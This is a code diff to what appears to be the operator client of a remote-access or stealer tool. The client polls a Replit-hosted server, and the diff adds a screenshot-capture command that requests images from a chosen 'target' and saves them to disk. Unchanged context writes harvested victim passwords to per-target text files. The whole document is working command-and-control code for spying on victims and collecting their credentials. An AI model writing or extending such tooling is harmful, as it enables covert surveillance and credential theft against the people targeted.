@@ -1,9 +1,12 @@
 import os
 import json
+import random
 import requests
 import threading
 import asyncio
 import subprocess
+import base64
+import time
 
 URL = "https://62d00077-98c1-400d-9c7d-d9148d8ec7b6-00-37654x8qsze2r.spock.replit.dev/" #"http://127.0.0.1:8080"
 LAST_TARGET = ""
@@ -37,7 +40,8 @@ class CommandClass:
         global LAST_TARGET
         try:
             target = input("Enter Target Here: ")
-            response = requests.get(f"{URL}/ss?target={target}&state=true&imgdata=nil_")
+            response = requests.post(f"{URL}/ss?target={target}&state=true", json={"imgdata": "nil_"})
+            LAST_TARGET = target
         except Exception as e:
             print(e)
             
@@ -104,11 +108,15 @@ def create_data_folder():
             print(f"Error creating 'data' folder: {e}")
 
 create_data_folder()
-import time
 
-def Test():
-    while True:
-        time.sleep(1)
+def get_screenshot(username, base64_string):
+    uid = random.randint(1, 50000)
+    base64_string = base64.b32decode(base64_string)
+    print(f"\nFile Path: {current_directory}/data/{username}-{uid}.png\nCommand: ", end="")
+    with open(f'{current_directory}/data/{username}-{uid}.png','wb') as dest_image:
+        dest_image.write(base64_string)
+    requests.post(f"{URL}/ss?target={username}&state=true", json={"imgdata": "nil_"})
+
 
 def listen():
     global LAST_TARGET
@@ -133,9 +141,12 @@ def listen():
                     with open(f"{current_directory}/passwords-{LAST_TARGET}.txt", "w") as f:
                         for password_info in v["passwords"]:
                             f.write(password_info + "\n")
-                            
                     LAST_TARGET = ""
-                        
+                elif i == "ss" and v["imgdata"] != "":
+                    get_screenshot(LAST_TARGET, v["imgdata"])
+                    
+                    LAST_TARGET = ""
+                
             time.sleep(5)
         except Exception as e:
             print(f"{e}")
